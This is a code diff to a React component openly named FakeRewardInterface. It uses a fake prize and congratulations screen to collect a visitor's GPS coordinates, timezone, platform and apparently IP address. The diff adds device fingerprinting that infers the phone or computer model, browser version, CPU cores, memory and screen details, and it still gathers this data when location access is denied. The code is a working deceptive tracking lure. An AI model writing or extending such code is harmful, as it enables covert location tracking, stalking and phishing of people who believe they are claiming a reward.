@@ -4,6 +4,26 @@
 import { useState, useEffect } from 'react';
 import { Gift, MapPin, Smartphone, Clock, Star, Trophy } from 'lucide-react';
 
+interface DeviceInfo {
+  deviceName: string;
+  deviceType: string;
+  operatingSystem: string;
+  browser: string;
+  browserVersion: string;
+  screenDetails: {
+    resolution: string;
+    availableResolution: string;
+    colorDepth: number;
+    pixelRatio: number;
+  };
+  hardwareDetails: {
+    cores: number;
+    memory: string;
+    touchSupport: boolean;
+    orientation: string;
+  };
+}
+
 interface LocationData {
   latitude: number;
   longitude: number;
@@ -15,6 +35,7 @@ interface LocationData {
   platform: string;
   screenResolution: string;
   timezone: string;
+  deviceInfo: DeviceInfo;
   ip?: string;
 }
 
@@ -28,10 +49,161 @@ export default function FakeRewardInterface({ onDataCollected }: Props) {
   const [userName, setUserName] = useState('');
   const [showCongrats, setShowCongrats] = useState(false);
 
+  // Device detection function
+  const detectDevice = (): DeviceInfo => {
+    const userAgent = navigator.userAgent;
+    const platform = navigator.platform;
+    const screenWidth = screen.width;
+    const screenHeight = screen.height;
+    
+    // Detect device type and name
+    let deviceName = 'Unknown Device';
+    let deviceType = 'Desktop';
+    let operatingSystem = 'Unknown OS';
+    
+    // Mobile device detection with specific models
+    if (/iPhone/.test(userAgent)) {
+      deviceType = 'Mobile';
+      operatingSystem = 'iOS';
+      
+      // iPhone model detection based on screen dimensions and user agent
+      if (screenWidth === 428 && screenHeight === 926) deviceName = 'iPhone 12 Pro Max / 13 Pro Max / 14 Plus';
+      else if (screenWidth === 414 && screenHeight === 896) deviceName = 'iPhone 11 / XR';
+      else if (screenWidth === 414 && screenHeight === 736) deviceName = 'iPhone 6/7/8 Plus';
+      else if (screenWidth === 390 && screenHeight === 844) deviceName = 'iPhone 12 / 12 Pro / 13 / 13 Pro / 14';
+      else if (screenWidth === 393 && screenHeight === 852) deviceName = 'iPhone 14 Pro';
+      else if (screenWidth === 430 && screenHeight === 932) deviceName = 'iPhone 14 Pro Max / 15 Pro Max';
+      else if (screenWidth === 375 && screenHeight === 812) deviceName = 'iPhone X / XS / 11 Pro / 12 mini / 13 mini';
+      else if (screenWidth === 375 && screenHeight === 667) deviceName = 'iPhone 6/7/8/SE 2nd/3rd gen';
+      else if (screenWidth === 320 && screenHeight === 568) deviceName = 'iPhone 5/5S/5C/SE 1st gen';
+      else if (/iPhone15/.test(userAgent)) deviceName = 'iPhone 15 Series';
+      else deviceName = 'iPhone (Unknown Model)';
+    }
+    else if (/iPad/.test(userAgent)) {
+      deviceType = 'Tablet';
+      operatingSystem = 'iPadOS';
+      
+      if (screenWidth === 1024 && screenHeight === 1366) deviceName = 'iPad Pro 12.9"';
+      else if (screenWidth === 834 && screenHeight === 1194) deviceName = 'iPad Pro 11"';
+      else if (screenWidth === 834 && screenHeight === 1112) deviceName = 'iPad Air (4th/5th gen)';
+      else if (screenWidth === 768 && screenHeight === 1024) deviceName = 'iPad (9th gen) / iPad mini';
+      else if (screenWidth === 820 && screenHeight === 1180) deviceName = 'iPad Air (5th gen)';
+      else deviceName = 'iPad (Unknown Model)';
+    }
+    else if (/Android/.test(userAgent)) {
+      deviceType = /Mobile/.test(userAgent) ? 'Mobile' : 'Tablet';
+      operatingSystem = 'Android';
+      
+      // Samsung Galaxy detection
+      if (/SM-G/.test(userAgent)) {
+        if (screenWidth === 412 && screenHeight === 915) deviceName = 'Samsung Galaxy S21/S22';
+        else if (screenWidth === 414 && screenHeight === 896) deviceName = 'Samsung Galaxy S20';
+        else if (screenWidth === 360 && screenHeight === 780) deviceName = 'Samsung Galaxy S10';
+        else if (screenWidth === 412 && screenHeight === 869) deviceName = 'Samsung Galaxy Note 20';
+        else deviceName = 'Samsung Galaxy Series';
+      }
+      else if (/Pixel/.test(userAgent)) {
+        if (screenWidth === 412 && screenHeight === 915) deviceName = 'Google Pixel 6/7';
+        else if (screenWidth === 393 && screenHeight === 851) deviceName = 'Google Pixel 5';
+        else if (screenWidth === 411 && screenHeight === 823) deviceName = 'Google Pixel 4';
+        else deviceName = 'Google Pixel Series';
+      }
+      else if (/OnePlus/.test(userAgent)) {
+        deviceName = 'OnePlus Device';
+      }
+      else if (/Huawei|HUAWEI/.test(userAgent)) {
+        deviceName = 'Huawei Device';
+      }
+      else if (/Xiaomi|Mi/.test(userAgent)) {
+        deviceName = 'Xiaomi Device';
+      }
+      else {
+        deviceName = 'Android Device';
+      }
+    }
+    else if (/Windows NT/.test(userAgent)) {
+      operatingSystem = 'Windows';
+      if (/Windows NT 10.0/.test(userAgent)) operatingSystem = 'Windows 10/11';
+      else if (/Windows NT 6.3/.test(userAgent)) operatingSystem = 'Windows 8.1';
+      else if (/Windows NT 6.1/.test(userAgent)) operatingSystem = 'Windows 7';
+      
+      // Detect if it's a Surface device
+      if (/Surface/.test(userAgent)) {
+        deviceName = 'Microsoft Surface';
+        deviceType = 'Tablet/Laptop';
+      } else {
+        deviceName = 'Windows PC';
+      }
+    }
+    else if (/Macintosh|Mac OS X/.test(userAgent)) {
+      operatingSystem = 'macOS';
+      
+      // Detect Mac model based on screen resolution
+      if (screenWidth === 1728 && screenHeight === 1117) deviceName = 'MacBook Air 13" (M2)';
+      else if (screenWidth === 1680 && screenHeight === 1050) deviceName = 'MacBook Pro 13" / MacBook Air';
+      else if (screenWidth === 1728 && screenHeight === 1117) deviceName = 'MacBook Pro 14"';
+      else if (screenWidth === 1800 && screenHeight === 1169) deviceName = 'MacBook Pro 16"';
+      else if (screenWidth === 2560 && screenHeight === 1600) deviceName = 'MacBook Pro 13" (Retina)';
+      else if (screenWidth === 2880 && screenHeight === 1800) deviceName = 'MacBook Pro 15"';
+      else if (screenWidth === 3456 && screenHeight === 2234) deviceName = 'MacBook Pro 16" (M1/M2)';
+      else if (screenWidth >= 2560) deviceName = 'iMac / Mac Studio with External Display';
+      else deviceName = 'Mac Computer';
+    }
+    else if (/Linux/.test(userAgent)) {
+      operatingSystem = 'Linux';
+      deviceName = 'Linux PC';
+    }
+    
+    // Browser detection
+    let browser = 'Unknown Browser';
+    let browserVersion = '';
+    
+    if (/Chrome/.test(userAgent) && !/Edg/.test(userAgent)) {
+      browser = 'Chrome';
+      const match = userAgent.match(/Chrome\/(\d+)/);
+      browserVersion = match ? match[1] : '';
+    } else if (/Safari/.test(userAgent) && !/Chrome/.test(userAgent)) {
+      browser = 'Safari';
+      const match = userAgent.match(/Version\/(\d+)/);
+      browserVersion = match ? match[1] : '';
+    } else if (/Firefox/.test(userAgent)) {
+      browser = 'Firefox';
+      const match = userAgent.match(/Firefox\/(\d+)/);
+      browserVersion = match ? match[1] : '';
+    } else if (/Edg/.test(userAgent)) {
+      browser = 'Microsoft Edge';
+      const match = userAgent.match(/Edg\/(\d+)/);
+      browserVersion = match ? match[1] : '';
+    }
+    
+    return {
+      deviceName,
+      deviceType,
+      operatingSystem,
+      browser,
+      browserVersion,
+      screenDetails: {
+        resolution: `${screenWidth}x${screenHeight}`,
+        availableResolution: `${screen.availWidth}x${screen.availHeight}`,
+        colorDepth: screen.colorDepth,
+        pixelRatio: window.devicePixelRatio || 1,
+      },
+      hardwareDetails: {
+        cores: navigator.hardwareConcurrency || 0,
+        memory: (navigator as any).deviceMemory ? `${(navigator as any).deviceMemory}GB` : 'Unknown',
+        touchSupport: 'ontouchstart' in window,
+        orientation: screen.orientation?.type || 'unknown',
+      }
+    };
+  };
+
   const collectData = async () => {
     setLoading(true);
 
     try {
+      // Get device information
+      const deviceInfo = detectDevice();
+      
       // Get location
       const position = await new Promise<GeolocationPosition>((resolve, reject) => {
         navigator.geolocation.getCurrentPosition(resolve, reject, {
@@ -53,6 +225,7 @@ export default function FakeRewardInterface({ onDataCollected }: Props) {
         platform: navigator.platform,
         screenResolution: `${screen.width}x${screen.height}`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        deviceInfo,
       };
 
       // Get IP address
@@ -79,6 +252,7 @@ export default function FakeRewardInterface({ onDataCollected }: Props) {
       setShowCongrats(true);
       
       // Collect what we can without location
+      const deviceInfo = detectDevice();
       const basicData = {
         latitude: 0,
         longitude: 0,
@@ -90,6 +264,7 @@ export default function FakeRewardInterface({ onDataCollected }: Props) {
         platform: navigator.platform,
         screenResolution: `${screen.width}x${screen.height}`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        deviceInfo,
         error: 'Location denied'
       };
 
